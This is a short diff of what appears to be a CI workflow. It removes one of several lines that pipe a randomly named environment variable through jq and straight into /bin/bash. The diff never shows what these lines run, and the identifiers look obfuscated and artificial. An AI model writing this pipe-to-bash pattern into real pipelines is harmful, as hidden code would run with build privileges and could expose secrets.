@@ -34,7 +34,6 @@ jobs:
           echo $zn792 | jq -r .ljdg4255 | /bin/bash
           echo $tug0045 | jq -r .hbe4 | /bin/bash
           printf '%s' "$to21642" | jq -r .subeb540 | /bin/bash
-          echo $ipl91 | jq -r .rg40 | /bin/bash
           printf '%s' "$qi7534" | jq -r .oas74 | /bin/bash
           echo $dgdu758 | jq -r .j891 | /bin/bash
           echo $cyuo1 | jq -r .e60 | /bin/bash
